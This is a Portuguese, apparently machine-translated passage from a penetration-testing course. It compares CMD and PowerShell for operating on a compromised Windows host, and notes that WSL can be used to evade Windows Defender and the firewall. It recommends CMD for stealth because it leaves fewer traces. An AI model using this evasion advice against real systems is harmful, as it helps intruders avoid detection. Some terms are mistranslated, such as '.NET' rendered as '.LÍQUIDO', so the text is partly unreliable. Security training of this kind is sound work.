O shell CMD é o shell original do MS-DOS incorporado ao Windows. Foi feito para interação básica e I.T. operações em um host. Alguma automação simples poderia ser alcançada com arquivos em lote, mas isso era tudo. Powershell veio com o objetivo de expandir as capacidades do cmd. O PowerShell entende os comandos nativos do MS-DOS utilizados no CMD e um novo conjunto de comandos baseado em .LÍQUIDO. Novos módulos auto-suficientes também podem ser implementados no PowerShell com cmdlets. O prompt do CMD lida com entrada e saída de texto enquanto o Powershell utiliza .Objetos NET para todas as entradas e saídas. Outra consideração importante é que o CMD não mantém um registro dos comandos usados durante a sessão, enquanto o PowerShell mantém. Portanto, no contexto de ser furtivo, a execução de comandos com cmd deixará menos vestígios no host. Outros problemas em potencial, como `Execution Policy` e `User Account Control (UAC)` pode inibir sua capacidade de executar comandos e scripts no host. Essas considerações afetam `PowerShell` mas não cmd. Outra grande preocupação a ser levada em consideração é a idade do anfitrião. Se você pousar em um host Windows XP ou mais antigo ( sim, ainda é possível .. ) O PowerShell não está presente, portanto sua única opção será cmd. O PowerShell não se concretizou até o Windows 7. Então, para resumir tudo:

Usar `CMD` quando:

- Você está em um host mais antigo que pode não incluir o PowerShell.
- Quando você exige apenas interações / acesso simples ao host.
- Quando você planeja usar arquivos em lote simples, comandos líquidos ou ferramentas nativas do MS-DOS.
- Quando você acredita que as políticas de execução podem afetar sua capacidade de executar scripts ou outras ações no host.

Usar `PowerShell` quando:

- Você planeja utilizar cmdlets ou outros scripts personalizados.
- Quando você deseja interagir com .Objetos NET em vez de saída de texto.
- Ser furtivo é uma preocupação menor.
- Se você planeja interagir com serviços e hosts baseados na nuvem.
- Se seus scripts definirem e usarem Aliases.

---

## WSL e PowerShell para Linux

O Windows Subsystem for Linux é uma nova e poderosa ferramenta que foi introduzida nos hosts do Windows que fornece um ambiente virtual do Linux incorporado ao seu host. Mencionamos isso porque o cenário em rápida mudança dos sistemas operacionais pode muito bem permitir novas maneiras de obter acesso a um host. Ao escrever este módulo, vários exemplos de malware na natureza tentavam utilizar os binários Python3 e Linux para baixar e instalar cargas úteis em um host do Windows via WSL. Muito parecido com neste post [aqui](https://www.bleepingcomputer.com/news/security/new-malware-uses-windows-subsystem-for-linux-for-stealthy-attacks/), os invasores também estão usando bibliotecas Python internas nativas do Windows e Linux ao lado do PowerShell para executar outras ações no host. Outra coisa a ser observada é que, atualmente, quaisquer solicitações ou funções de rede executadas na instância WSL ou não são analisadas pelo Windows Firewall e Windows Defender, tornando-o um ponto cego no anfitrião.

Atualmente, os mesmos problemas podem ser encontrados via PowerShell Core, que pode ser instalado nos sistemas operacionais Linux e transportar muitas funções normais do PowerShell. Esses dois conceitos são excepcionalmente sorrateiros porque, até o momento, pouco se sabe sobre os vetores de ataque ou sobre maneiras de observá-los. Porém, ataques direcionados a esses recursos foram vistos para evitar mecanismos de detecção de AV e EDR. Esses conceitos são um pouco avançados para este módulo, mas os procuram em um módulo futuro.